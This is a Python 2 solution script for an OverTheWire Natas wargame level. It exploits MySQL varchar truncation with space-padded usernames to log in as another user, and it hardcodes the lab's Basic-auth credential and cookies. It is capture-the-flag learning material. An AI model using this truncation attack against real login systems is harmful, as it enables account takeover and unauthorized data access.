#!/usr/bin/python
import urllib
import urllib2
import binascii
import base64

#
#
# This level Introduce Unique Bug in mysql_fetch_assoc($res))
# and loose data handling of ' ' <- this is a space character 
# /*
# CREATE TABLE `users` (
#   `username` varchar(64) DEFAULT NULL,
#   `password` varchar(64) DEFAULT NULL
# );
# */ 
#
# In Simple Words, As We Decleared In Above Declearation, MySQL Thinks That Our Row Feild Length
# is maximum 64 And yex, We Going To maintain this illusion for mysql with the help of ' ' spaces
# in simple words, Like Create 
#  Username checkthis + ' '+60+' Username'
#  Password anything
# 
# So, During Find row process mysql will match only username = ourusername[64] and because of loose
# data types, condition will be True
# 
# Hence, 
# 
def request_generate(URL, COOKIE='', data={}):
    req = urllib2.Request(URL, data=urllib.urlencode(data))
    req.add_header('User-Agent',  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0')
    req.add_header('Authorization', 'Basic bmF0YXMyNzo1NVRCanBQWlVVSmdWUDViM0JuYkc2T045dURQVnpDSg==')
    req.add_header('Cookie', '__cfduid=d343ee483747c1158b3dd095b778a57ff1549137174;' + COOKIE)
    return urllib2.urlopen(req)


# main function
def main():
    URL = 'http://natas27.natas.labs.overthewire.org/index.php'
    SESSID='7b2q0fb8sshqljnrb79hitmno4'
    req = request_generate(URL,'', data={'username':'natas28'+' '*58+'yes', 'password':'yesitsworking'})
    print req.read()
    
    req = request_generate(URL,'', data={'username':'natas28', 'password':'yesitsworking'})
    print req.read()
if __name__=='__main__':
    main()
